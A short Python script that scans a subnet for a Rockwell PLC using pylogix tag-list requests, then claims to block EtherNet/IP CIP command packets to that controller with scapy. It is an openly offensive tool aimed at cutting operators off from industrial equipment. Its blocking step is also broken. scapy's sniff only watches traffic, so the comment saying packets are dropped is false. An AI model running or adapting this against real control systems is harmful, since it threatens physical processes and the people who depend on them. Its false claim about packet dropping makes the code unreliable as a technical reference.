from scapy.all import *
import socket
import struct
import time
from pylogix import PLC

# Function to discover the Rockwell PLC IP address via network scanning
def find_plc_ip(subnet="192.168.1"):
    for i in range(1, 255):  # Scan subnet range
        ip = f"{subnet}.{i}"
        try:
            client = PLC()
            client.IPAddress = ip
            response = client.GetTagList()  # Send a request to verify PLC existence
            client.Close()
            if response:
                print(f"[+] PLC Found at: {ip}")
                return ip
        except Exception:
            continue
    print("[-] Failed to find PLC")
    return None

# Function to block CIP command packets to the PLC (EtherNet/IP messages)
def block_command_messages(plc_ip):
    print(f"[+] Blocking command packets to PLC at {plc_ip}")

    def packet_callback(pkt):
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            if pkt[IP].dst == plc_ip and pkt[TCP].dport == 44818:  # EtherNet/IP CIP Port
                print(f"[!] Blocking Command Packet: {pkt.summary()}")
                return  # Drops the packet by not forwarding it

    sniff(filter=f"tcp and dst {plc_ip} and dst port 44818", prn=packet_callback, store=0)

# Main execution
if __name__ == "__main__":
    print("[*] Searching for PLC IP...")
    plc_ip = find_plc_ip()
    
    if plc_ip:
        block_command_messages(plc_ip)
    else:
        print("[-] Unable to locate PLC. Exiting.")